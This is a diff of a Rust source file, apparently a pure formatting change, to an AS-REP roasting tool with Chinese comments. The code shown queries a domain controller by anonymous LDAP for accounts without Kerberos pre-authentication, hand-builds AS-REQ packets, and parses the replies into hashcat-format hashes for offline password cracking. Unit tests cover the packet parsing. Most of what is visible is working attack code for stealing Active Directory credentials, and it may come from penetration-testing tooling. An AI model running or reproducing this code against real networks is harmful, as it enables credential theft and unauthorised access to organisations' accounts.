@@ -73,8 +73,7 @@ struct AsrepTarget {
 /// LDAP查询DONT_REQ_PREAUTH用户
 async fn query_asrep_users(dc: &str, domain: &str) -> Result<Vec<AsrepTarget>, String> {
     let ldap_url = format!("ldap://{}:389", dc);
-    let mut ldap = ldap3::LdapConn::new(&ldap_url)
-        .map_err(|e| format!("LDAP连接失败: {}", e))?;
+    let mut ldap = ldap3::LdapConn::new(&ldap_url).map_err(|e| format!("LDAP连接失败: {}", e))?;
 
     // 匿名绑定
     ldap.simple_bind("", "")
@@ -92,15 +91,21 @@ async fn query_asrep_users(dc: &str, domain: &str) -> Result<Vec<AsrepTarget>, S
     let mut targets = Vec::new();
     for entry in &sr.0 {
         let entry = ldap3::SearchEntry::construct(entry.clone());
-        let username = entry.attrs.get("sAMAccountName")
+        let username = entry
+            .attrs
+            .get("sAMAccountName")
             .and_then(|v| v.first().cloned())
             .unwrap_or_default();
-        let uac: u32 = entry.attrs.get("userAccountControl")
+        let uac: u32 = entry
+            .attrs
+            .get("userAccountControl")
             .and_then(|v| v.first())
             .and_then(|v| v.parse().ok())
             .unwrap_or(0);
         let enabled = uac & 2 == 0; // ACCOUNTDISABLE
-        let description = entry.attrs.get("description")
+        let description = entry
+            .attrs
+            .get("description")
             .and_then(|v| v.first().cloned());
 
         if !username.is_empty() {
@@ -167,8 +172,7 @@ async fn send_as_req(
     }
 
     // 解析AS-REP
-    let (etype, encrypted_part, hashcat_hash) =
-        parse_as_rep(&buf, domain, &target.username)?;
+    let (etype, encrypted_part, hashcat_hash) = parse_as_rep(&buf, domain, &target.username)?;
 
     Ok(Some(AsrepTicket {
         username: target.username.clone(),
@@ -196,9 +200,7 @@ fn build_as_req_no_preauth(domain: &str, username: &str) -> Vec<u8> {
     // kdc-options [0] BIT STRING
     // FORWARDABLE | RENEWABLE | CANONICALIZE = 0x50800000
     // 不设置PRE_AUTH相关标志
-    req_body.extend_from_slice(&[
-        0xA0, 0x08, 0x03, 0x06, 0x00, 0x50, 0x80, 0x00, 0x00, 0x00,
-    ]);
+    req_body.extend_from_slice(&[0xA0, 0x08, 0x03, 0x06, 0x00, 0x50, 0x80, 0x00, 0x00, 0x00]);
 
     // cname [1] PrincipalName
     #[allow(clippy::vec_init_then_push)]
@@ -267,9 +269,8 @@ fn build_as_req_no_preauth(domain: &str, username: &str) -> Vec<u8> {
 
     // till [4] GeneralizedTime (20370913024805Z)
     req_body.extend_from_slice(&[
-        0xA4, 0x11, 0x18, 0x0F, 0x32, 0x30, 0x33, 0x37,
-        0x30, 0x39, 0x31, 0x33, 0x30, 0x32, 0x34, 0x38,
-        0x30, 0x35, 0x5A,
+        0xA4, 0x11, 0x18, 0x0F, 0x32, 0x30, 0x33, 0x37, 0x30, 0x39, 0x31, 0x33, 0x30, 0x32, 0x34,
+        0x38, 0x30, 0x35, 0x5A,
     ]);
 
     // nonce [5] INTEGER (随机数)
@@ -278,9 +279,7 @@ fn build_as_req_no_preauth(domain: &str, username: &str) -> Vec<u8> {
     // etype [8] SEQUENCE OF INTEGER
     // RC4-HMAC(23), AES256-CTS(18), AES128-CTS(17)
     req_body.extend_from_slice(&[
-        0xA8, 0x0C,
-        0x30, 0x0A,
-        0x02, 0x01, 0x17, // 23
+        0xA8, 0x0C, 0x30, 0x0A, 0x02, 0x01, 0x17, // 23
         0x02, 0x01, 0x12, // 18
         0x02, 0x01, 0x11, // 17
     ]);
@@ -339,7 +338,11 @@ fn parse_krb_error_code(data: &[u8]) -> i32 {
 }
 
 /// 解析AS-REP响应，提取加密的enc-part
-fn parse_as_rep(data: &[u8], domain: &str, username: &str) -> Result<(i32, Vec<u8>, String), String> {
+fn parse_as_rep(
+    data: &[u8],
+    domain: &str,
+    username: &str,
+) -> Result<(i32, Vec<u8>, String), String> {
     if data.is_empty() {
         return Err("AS-REP响应为空".to_string());
     }
@@ -367,7 +370,9 @@ fn parse_as_rep(data: &[u8], domain: &str, username: &str) -> Result<(i32, Vec<u
                 let len_byte = inner[epos + 3] as usize;
                 if epos + 4 + len_byte <= inner.len() {
                     let etype_slice = &inner[epos + 4..epos + 4 + len_byte];
-                    etype = etype_slice.iter().fold(0i32, |acc, &b| (acc << 8) | b as i32);
+                    etype = etype_slice
+                        .iter()
+                        .fold(0i32, |acc, &b| (acc << 8) | b as i32);
                 }
             }
         }
@@ -428,7 +433,11 @@ fn push_asn1_length(buf: &mut Vec<u8>, len: usize) {
 
 /// 域名转DN
 fn domain_to_dn(domain: &str) -> String {
-    domain.split('.').map(|p| format!("DC={}", p)).collect::<Vec<_>>().join(",")
+    domain
+        .split('.')
+        .map(|p| format!("DC={}", p))
+        .collect::<Vec<_>>()
+        .join(",")
 }
 
 #[cfg(test)]
@@ -452,10 +461,7 @@ mod tests {
     #[test]
     fn test_parse_krb_error_code() {
         // error-code = 25 (KDC_ERR_PREAUTH_REQUIRED)
-        let data = vec![
-            0x7E, 0x10,
-            0xA6, 0x03, 0x02, 0x01, 0x19,
-        ];
+        let data = vec![0x7E, 0x10, 0xA6, 0x03, 0x02, 0x01, 0x19];
         assert_eq!(parse_krb_error_code(&data), 25);
     }
 
@@ -484,8 +490,8 @@ mod tests {
             0x30, 0x18, // SEQUENCE
             0xA0, 0x03, 0x02, 0x01, 0x12, // etype [0] = 18 (AES256)
             0xA2, 0x11, 0x04, 0x0F, // cipher [2] OCTET STRING (15 bytes)
-            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
-            0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E,
+            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D,
+            0x0E,
         ];
         let (etype, cipher, hashcat) = parse_as_rep(&data, "CORP", "testuser").unwrap();
         assert_eq!(etype, 18);
